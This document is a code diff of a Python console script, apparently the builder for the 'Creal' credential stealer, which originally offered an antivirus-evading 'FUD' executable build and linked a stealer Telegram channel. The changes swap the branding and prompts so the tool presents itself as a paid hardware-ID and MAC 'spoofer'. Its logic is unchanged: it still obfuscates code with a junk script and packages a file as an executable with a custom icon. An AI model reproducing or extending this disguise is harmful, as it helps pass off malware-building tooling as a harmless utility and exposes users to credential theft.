@@ -9,13 +9,7 @@ os.system('clear' if os.name == 'posix' else 'cls')
 
 intro = """
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐         
+     
 
                 > Press Enter                                         
 
@@ -26,13 +20,12 @@ Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interva
 
 print(f"""{Fore.LIGHTRED_EX}
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐    
+  ▄▄▄· ▄▄▄· ▪  ·▄▄▄▄    .▄▄ ·  ▄▄▄·            ·▄▄▄▄▄▄ .▄▄▄  
+▐█ ▄█▐█ ▀█ ██ ██· ██   ▐█ ▀. ▐█ ▄█ ▄█▀▄  ▄█▀▄ ▐▄▄ ▀▄.▀·▀▄ █·
+ ██▀·▄█▀▀█ ▐█·▐█▪ ▐█▌  ▄▀▀▀█▄ ██▀·▐█▌.▐▌▐█▌.▐▌█  ▪▐▀▀▪▄▐▀▀▄ 
+▐█▪·•▐█▪ ▐▌▐█▌██. ██   ▐█▄▪▐█▐█▪·•▐█▌.▐▌▐█▌.▐▌██ .▐█▄▄▌▐█•█▌
+.▀    ▀  ▀ ▀▀▀▀▀▀▀▀•    ▀▀▀▀ .▀    ▀█▄▀▪ ▀█▄▀▪▀▀▀  ▀▀▀ .▀  ▀
+by ritualzzzz
 
             Welcome to builder
 
@@ -43,8 +36,8 @@ time.sleep(1)
 
 while True:
     Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
-    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
-    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
+    Write.Print("\n1. Spoof hwid", Colors.red_to_yellow)
+    Write.Print("\n2. Spoof everything (Virus programs undetected)", Colors.red_to_yellow)
     Write.Print("\n3. Close", Colors.red_to_yellow)
     Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
     choice = input()
@@ -64,7 +57,7 @@ while True:
 
         obfuscate = False
         while True:
-            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\nAre you sure you want to spoof?  (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 os.system("python junk.py")
                 Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
@@ -74,9 +67,9 @@ while True:
             else:
                 Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
 
-        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+        answer = input(Fore.CYAN + "\nSpoof mac spoof ? (Y/N) " + Style.RESET_ALL)
         if answer.upper() == "Y":
-            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\ndisk spoof? (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 Tk().withdraw()  
                 icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
@@ -90,7 +83,7 @@ while True:
                 Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
 
     elif choice == "2":
-        Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer", Colors.red_to_yellow)
+        Write.Print("\Spoof went good!", Colors.red_to_yellow)
 
     elif choice == "3":
         Write.Print("\nExiting the program...", Colors.red_to_yellow)
